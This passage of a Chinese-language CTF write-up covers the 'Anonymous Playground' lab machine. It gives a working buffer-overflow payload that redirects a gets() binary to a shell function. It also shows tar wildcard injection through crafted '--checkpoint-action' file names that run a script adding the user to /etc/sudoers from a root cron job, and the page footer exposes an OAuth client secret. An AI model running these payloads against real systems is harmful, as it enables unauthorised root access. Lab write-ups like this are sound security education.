root   root   8528 Jul 10  2020 hacktheworld<br>drwxrwxr-x 3 magna  magna  4096 Jul  4  2020 .<span class="hljs-built_in">local</span><br>-rw-r--r-- 1 spooky spooky  324 Jul  6  2020 note_from_spooky.txt<br>-rw-r--r-- 1 magna  magna   807 Jul  4  2020 .profile<br>drwx------ 2 magna  magna  4096 Jul  4  2020 .ssh<br>-rw------- 1 magna  magna   817 Jul  7  2020 .viminfo<br></code></pre></td></tr></table></figure>

<p>看看note_from_spooky.txt。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">magna@anonymous-playground:~$ <span class="hljs-built_in">cat</span> note_from_spooky.txt <br>Hey Magna,<br><br>Check out this binary I made!  I<span class="hljs-string">&#x27;ve been practicing my skills in C so that I can get better at Reverse</span><br><span class="hljs-string">Engineering and Malware Development.  I think this is a really good start.  See if you can break it!</span><br><span class="hljs-string"></span><br><span class="hljs-string">P.S. I&#x27;</span>ve had the admins install radare2 and gdb so you can debug and reverse it right here!<br><br>Best,<br>Spooky<br></code></pre></td></tr></table></figure>

<p>发现spooky这小子要考考我们的逆向。那我们肯定要接受挑战。</p>
<p>（虽然他好心给我们装了radare2和gdb，但是用不太习惯，真得ida吧）</p>
<p class='item-img' data-src='/pic/assets/5c6d1e2fda21f.jpg'><img src="/pic/assets/5c6d1e2fda21f.jpg" alt="5c6d1e2fda21f"></p>
<p>我们直接scp把文件下载下来，丢进我们心爱的ida。</p>
<p>找到main函数，按F5看一下伪代码。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">char</span> v4[<span class="hljs-number">64</span>]; <span class="hljs-comment">// [rsp+10h] [rbp-40h] BYREF</span><br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Who do you want to hack? &quot;</span>);<br>  gets(v4);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>关键词提取：<code>gets()</code>,我们最喜欢的缓冲区溢出。如果不太熟悉缓冲区溢出漏洞利用可以看看这篇<a target="_blank" rel="noopener" href="https://blog.csdn.net/iczfy585/article/details/109150644">文章</a>,写的挺详细的。</p>
<p>发现了漏洞，那我们怎么利用呢，我们可以注意到函数里还有一个叫<code>call_bash</code>的函数，看看他是干吗的。</p>
<p class='item-img' data-src='/pic/assets/6f24b82247e629ffc7a4731efba78191.png'><img src="/pic/assets/6f24b82247e629ffc7a4731efba78191.png" alt="6f24b82247e629ffc7a4731efba78191"></p>
<p>其中<code>setuid(0x539u)</code>其实就是设计S位（0x539u代表16进制无符号数 ，转换过来就是S）。然后就是调用<code>sh</code>。然而我们查看整个程序流程执行下来并不会执行这个函数。然而我们前面有缓冲区溢出的漏洞可以利用，那么接下来目标明确，构造payload覆盖返回地址，跳转到<code>call_bash</code>函数即可。</p>
<p>那么前面覆盖的数据要多大呢，<code>char v4[64]; // [rsp+10h] [rbp-40h] BYREF</code>告诉我们数组有64字节，再加上64位程序BP是8字节。所以一共要填充64+8&#x3D;72位的字符，然后接上<code>call_bash</code>函数的返回地址<code>0000000000400657</code>，但是注意是小端存储所以要倒过来写。所以最终构造的payload如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -c <span class="hljs-string">&quot;print &#x27;a&#x27;*72+&#x27;\x57\x06\x40\x00\x00\x00\x00\x00&#x27;&quot;</span><br></code></pre></td></tr></table></figure>

<p>如果我们直接在命令行输入后面的16进制数会出问题，所以我们选择通过python输出，再管道符传给hacktheworld。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">magna@anonymous-playground:~$ python -c <span class="hljs-string">&quot;print &#x27;a&#x27;*72+&#x27;\x57\x06\x40\x00\x00\x00\x00\x00&#x27;&quot;</span> | ./hacktheworld <br>Who <span class="hljs-keyword">do</span> you want to hack? <br>We are Anonymous.<br>We are Legion.<br>We <span class="hljs-keyword">do</span> not forgive.<br>We <span class="hljs-keyword">do</span> not forget.<br>[Message corrupted]...Well...<span class="hljs-keyword">done</span>.<br>Segmentation fault (core dumped)<br></code></pre></td></tr></table></figure>

<p>我们可以发现我们已经成功调用了<code>call_bash</code>函数,但是最后还是给我们报了Segmentation fault (core dumped)错误。何意啊？说好的sh呢。</p>
<p>研究了一下，感觉可能是因为调用了sh后没有执行命令直接退出了。我们后面加个命令试试看吧。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">magna@anonymous-playground:~$ (python -c <span class="hljs-string">&quot;print &#x27;a&#x27;*72+&#x27;\x57\x06\x40\x00\x00\x00\x00\x00&#x27;&quot;</span>; <span class="hljs-built_in">cat</span>) | ./hacktheworld <br>Who <span class="hljs-keyword">do</span> you want to hack? <br>We are Anonymous.<br>We are Legion.<br>We <span class="hljs-keyword">do</span> not forgive.<br>We <span class="hljs-keyword">do</span> not forget.<br>[Message corrupted]...Well...<span class="hljs-keyword">done</span>.<br><span class="hljs-built_in">whoami</span><br>Segmentation fault (core dumped)<br></code></pre></td></tr></table></figure>

<p>还是不行，虽然好像是可以了，但是输入命令后就会错误退出。奇了怪了。百思不得其解，去查了下别人的wp发现是将<code>\x57</code>改成<code>\x58</code>就可以了，很奇怪。明明函数的起始地址是57，且我们已经成功调用到了函数，为啥会有这种问题。非常不可名状。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">magna@anonymous-playground:~$ (python -c <span class="hljs-string">&quot;print &#x27;a&#x27;*72+&#x27;\x58\x06\x40\x00\x00\x00\x00\x00&#x27;&quot;</span>; <span class="hljs-built_in">cat</span>) | ./hacktheworld<br>Who <span class="hljs-keyword">do</span> you want to hack? <br>We are Anonymous.<br>We are Legion.<br>We <span class="hljs-keyword">do</span> not forgive.<br>We <span class="hljs-keyword">do</span> not forget.<br>[Message corrupted]...Well...<span class="hljs-keyword">done</span>.<br><span class="hljs-built_in">whoami</span><br>spooky<br>python -c <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br>spooky@anonymous-playground:~$<br></code></pre></td></tr></table></figure>

<p>虽然没法解释但是成功了。那就接着往下走吧。</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>获得了spooky的权限，在home目录下能到第二个flag。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">spooky@anonymous-playground:/home/spooky$ <span class="hljs-built_in">ls</span> -la<br><span class="hljs-built_in">ls</span> -la<br>total 36<br>drwxr-xr-x 4 spooky spooky 4096 Jul 10  2020 .<br>drwxr-xr-x 5 root   root   4096 Jul  4  2020 ..<br>lrwxrwxrwx 1 root   root      9 Jul  4  2020 .bash_history -&gt; /dev/null<br>-rw-r--r-- 1 spooky spooky  220 Jul  4  2020 .bash_logout<br>-rw-r--r-- 1 spooky spooky 3771 Jul  4  2020 .bashrc<br>-rwxrwxrwx 1 spooky magna     0 Jul 10  2020 .confrc<br>-r-------- 1 spooky spooky   33 Jul  4  2020 flag.txt<br>drwxrwxr-x 3 spooky spooky 4096 Jul  5  2020 .<span class="hljs-built_in">local</span><br>-rw-r--r-- 1 spooky spooky  807 Jul  4  2020 .profile<br>drwx------ 2 spooky spooky 4096 Jul  8  2020 .ssh<br>-rw-rw-r-- 1 spooky magna   535 Jul 10  2020 .webscript<br></code></pre></td></tr></table></figure>

<p>其中这个<code>.webscript</code>文件很可疑，看看它的内容。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs bash">spooky@anonymous-playground:/home/spooky$ <span class="hljs-built_in">cat</span> .web<br><span class="hljs-built_in">cat</span> .webscript <br><span class="hljs-comment">#!/bin/sh</span><br><br><span class="hljs-comment"># get current user uid / gid</span><br>CURR_UID=<span class="hljs-string">&quot;<span class="hljs-subst">$(id -u)</span>&quot;</span><br>CURR_GID=<span class="hljs-string">&quot;<span class="hljs-subst">$(id -g)</span>&quot;</span><br><br><span class="hljs-comment"># save file</span><br><span class="hljs-built_in">cat</span> &gt; .cachefile.c &lt;&lt; <span class="hljs-string">EOF</span><br><span class="hljs-string">#include &lt;stdio.h&gt;</span><br><span class="hljs-string">int main()</span><br><span class="hljs-string">&#123;</span><br><span class="hljs-string">setuid($CURR_UID);</span><br><span class="hljs-string">setgid($CURR_GID);</span><br><span class="hljs-string">execl(&quot;/bin/bash&quot;, &quot;-bash&quot;, NULL);</span><br><span class="hljs-string">return 0;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">EOF</span><br><br><span class="hljs-comment"># make folder where the payload will be saved</span><br><span class="hljs-built_in">mkdir</span> .cache<br><span class="hljs-built_in">chmod</span> 755 .cache<br><br><span class="hljs-comment"># compile &amp; give SUID</span><br>gcc -w .cachefile.c -o .cache/.cachefile<br><span class="hljs-built_in">chmod</span> 4755 .cache/.cachefile<br><br><span class="hljs-comment"># clean up</span><br><span class="hljs-built_in">rm</span> -rf ./<span class="hljs-string">&#x27;--checkpoint=1&#x27;</span><br><span class="hljs-built_in">rm</span> -rf ./<span class="hljs-string">&#x27;--checkpoint-action=exec=sh .webscript&#x27;</span><br><span class="hljs-built_in">rm</span> -rf .webscript<br><span class="hljs-built_in">rm</span> -rf .cachefile.c<br></code></pre></td></tr></table></figure>

<p>一路看下来这不是tar提权的典型应用吗？这是作者的提示吗？那我们看看定时任务里面是不是有tar自动打包任务吧。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">spooky@anonymous-playground:/home/dev$ <span class="hljs-built_in">cat</span> /etc/crontab<br><span class="hljs-built_in">cat</span> /etc/crontab<br><span class="hljs-comment"># /etc/crontab: system-wide crontab</span><br><span class="hljs-comment"># Unlike any other crontab you don&#x27;t have to run the `crontab&#x27;</span><br><span class="hljs-comment"># command to install the new version when you edit this file</span><br><span class="hljs-comment"># and files in /etc/cron.d. These files also have username fields,</span><br><span class="hljs-comment"># that none of the other crontabs do.</span><br><br>SHELL=/bin/sh<br>PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin<br><br><span class="hljs-comment"># m h dom mon dow user  command</span><br>17 *    * * *   root    <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.hourly<br>25 6    * * *   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.daily )<br>47 6    * * 7   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.weekly )<br>52 6    1 * *   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.monthly )<br>*/1 *   * * *   root    <span class="hljs-built_in">cd</span> /home/spooky &amp;&amp; tar -zcf /var/backups/spooky.tgz *<br><span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>

<p>果不其然，确实有。而且<code>tar *</code>,那就可以直接利用了。</p>
<h3 id="tar提权"><a href="#tar提权" class="headerlink" title="tar提权"></a>tar提权</h3><ol>
<li><p>tar提权第一步，先写好利用脚本。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">spooky@anonymous-playground:/home/spooky$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;#!/bin/bash&#x27;</span> &gt; exp.sh<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;#!/bin/bash&#x27;</span> &gt; exp.sh<br>spooky@anonymous-playground:/home/spooky$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&#x27;</span> &gt;&gt; exp.sh<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&#x27;</span> &gt;&gt; exp.sh<br>spooky@anonymous-playground:/home/spooky$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;echo &quot;spooky ALL=(ALL) NOPASSWD:ALL&quot; &gt;&gt; /etc/sudoers&#x27;</span> &gt;&gt; exp.sh<br>ALL<span class="hljs-string">&quot; &gt;&gt; /etc/sudoers&#x27; &gt;&gt; exp.shPASSWD:A</span><br><span class="hljs-string">spooky@anonymous-playground:/home/spooky$ cat exp.sh</span><br><span class="hljs-string">cat exp.sh</span><br><span class="hljs-string">#!/bin/bash</span><br><span class="hljs-string">echo &quot;</span>spooky ALL=(ALL) NOPASSWD:ALL<span class="hljs-string">&quot; &gt;&gt; /etc/sudoers</span><br></code></pre></td></tr></table></figure>

<p>我们希望把当前用户写入sudoers用户组，之后就可以为所欲为。</p>
</li>
<li><p>第二步创建checkpoint。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">spooky@anonymous-playground:/home/spooky$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&#x27;</span> &gt; <span class="hljs-string">&#x27;--checkpoint-action=exec=sh exp.sh&#x27;</span>   <br> exp.sh<span class="hljs-string">&#x27;&gt; &#x27;</span>--checkpoint-action=<span class="hljs-built_in">exec</span>=sh <br>spooky@anonymous-playground:/home/spooky$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&#x27;</span> &gt; --checkpoint=1<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&#x27;</span> &gt; --checkpoint=1<br>spooky@anonymous-playground:/home/spooky$ <span class="hljs-built_in">ls</span> -la<br><span class="hljs-built_in">ls</span> -la<br>total 48<br>drwxr-xr-x 4 spooky spooky 4096 Jul  5 09:05  .<br>drwxr-xr-x 5 root   root   4096 Jul  4  2020  ..<br>lrwxrwxrwx 1 root   root      9 Jul  4  2020  .bash_history -&gt; /dev/null<br>-rw-r--r-- 1 spooky spooky  220 Jul  4  2020  .bash_logout<br>-rw-r--r-- 1 spooky spooky 3771 Jul  4  2020  .bashrc<br>-rw-rw-r-- 1 spooky magna     1 Jul  5 09:05 <span class="hljs-string">&#x27;--checkpoint=1&#x27;</span><br>-rw-rw-r-- 1 spooky magna     1 Jul  5 09:04 <span class="hljs-string">&#x27;--checkpoint-action=exec=sh exp.sh&#x27;</span><br>-rwxrwxrwx 1 spooky magna     0 Jul 10  2020  .confrc<br>-rw-rw-r-- 1 spooky magna    66 Jul  5 09:02  exp.sh<br>-r-------- 1 spooky spooky   33 Jul  4  2020  flag.txt<br>drwxrwxr-x 3 spooky spooky 4096 Jul  5  2020  .<span class="hljs-built_in">local</span><br>-rw-r--r-- 1 spooky spooky  807 Jul  4  2020  .profile<br>drwx------ 2 spooky spooky 4096 Jul  8  2020  .ssh<br>-rw-rw-r-- 1 spooky magna   535 Jul 10  2020  .webscript<br></code></pre></td></tr></table></figure>
</li>
<li><p>第三步猎人布下了陷阱正在等待猎物。因为定时任务表里是<code>*/1</code>应该是每分钟都会执行一次，所以很快就会出结果。</p>
</li>
<li><p>过了一会尝试<code>sudo -l</code>发现搞定了。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs bash">spooky@anonymous-playground:/home/spooky$ sudo -l<br>sudo -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> spooky on anonymous-playground:<br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin<br><br>User spooky may run the following commands on anonymous-playground:<br>    (ALL) NOPASSWD: ALL<br>    (ALL) NOPASSWD: ALL<br>spooky@anonymous-playground:/home/spooky$ sudo su<br>sudo su<br>root@anonymous-playground:/home/spooky<span class="hljs-comment"># cd /root</span><br><span class="hljs-built_in">cd</span> /root<br>root@anonymous-playground:~<span class="hljs-comment"># ls -la</span><br><span class="hljs-built_in">ls</span> -la<br>total 408<br>drwx------  7 root root   4096 Jul  8  2020 .<br>drwxr-xr-x 24 root root   4096 Jul  4  2020 ..<br>lrwxrwxrwx  1 root root      9 Jul  4  2020 .bash_history -&gt; /dev/null<br>-rw-r--r--  1 root root   3106 Apr  9  2018 .bashrc<br>drwx------  3 root root   4096 Jul  6  2020 .cache<br>drwxr-xr-x  3 root root   4096 Jul  7  2020 .config<br>-r--------  1 root root     33 Jul  4  2020 flag.txt<br>-rw-------  1 root root    242 Jul  8  2020 .gdb_history<br>-rw-r--r--  1 root root     29 Jul  7  2020 .gdbinit<br>-rw-r--r--  1 root root 356593 Jul  7  2020 .gdbinit-gef.py<br>drwx------  3 root root   4096 Jul  4  2020 .gnupg<br>drwxr-xr-x  3 root root   4096 Jul  4  2020 .<span class="hljs-built_in">local</span><br>-rw-r--r--  1 root root    148 Aug 17  2015 .profile<br>-rw-r--r--  1 root root     66 Jul  5  2020 .selected_editor<br>drwx------  2 root root   4096 Jul  7  2020 .ssh<br>-rw-r--r--  1 root root    215 Jul  7  2020 .wget-hsts<br>root@anonymous-playground:~<span class="hljs-comment"># cat flag.txt</span><br></code></pre></td></tr></table></figure>

<p>拿到root flag。</p>
</li>
</ol>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这台机子比较偏向ctf，各方向知识点都有点，虽然都不难，但是要求我们开阔知识面。每样都得会点。</p>
<div id="paginator"></div></div><div id="post-footer"><div id="pages" style="justify-content: flex-end"><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/07/03/Precious/">[HTB]  Precious Prev →</a></div></div></div><div id="comments"><div class="selector"><button class="gitalk-sel"></button></div><div id="gitalk"></div></div></div><div class="bottom-btn"><div><a id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧</a><a id="to-index" href="#toc-div" title="To Catalog">≡</a><a id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">Dr.T3yT3y</a></h1><div id="description"><p>May the flame guide thee</p></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.</span> <span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E3%80%81%E6%9C%8D%E5%8A%A1%E7%AD%89%E6%89%AB%E6%8F%8F"><span class="toc-number">2.1.</span> <span class="toc-text">端口、服务等扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%89%AB"><span class="toc-number">2.2.</span> <span class="toc-text">漏扫</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#nmap%E8%84%9A%E6%9C%AC%E6%89%AB%E6%8F%8F"><span class="toc-number">2.2.1.</span> <span class="toc-text">nmap脚本扫描</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#nikto"><span class="toc-number">2.2.2.</span> <span class="toc-text">nikto</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web%E6%B8%97%E9%80%8F"><span class="toc-number">3.</span> <span class="toc-text">web渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E5%AF%86%E5%AF%86%E6%96%87"><span class="toc-number">3.1.</span> <span class="toc-text">解密密文</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E7%AB%8B%E8%B6%B3%E7%82%B9"><span class="toc-number">3.2.</span> <span class="toc-text">获取立足点</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">4.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA"><span class="toc-number">4.1.</span> <span class="toc-text">缓冲区溢出</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">5.</span> <span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#tar%E6%8F%90%E6%9D%83"><span class="toc-number">5.1.</span> <span class="toc-text">tar提权</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">6.</span> <span class="toc-text">总结</span></a></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plu</a></nobr><wbr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {gitalk = new Gitalk({
 clientID: 'd746fee266fd40784c87',
 clientSecret: '18467221d189fe0e0b51bd234fcd04785a28ab09',
 repo: 'T3yT3y.github.io',
 owner: 'T3yT3y',
 admin: ['T3yT3y'],
 distractionFreeMode: false,
 id: location.pathname
});
if (document.querySelector("#gitalk")) gitalk.render("gitalk");code.findCode();
document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>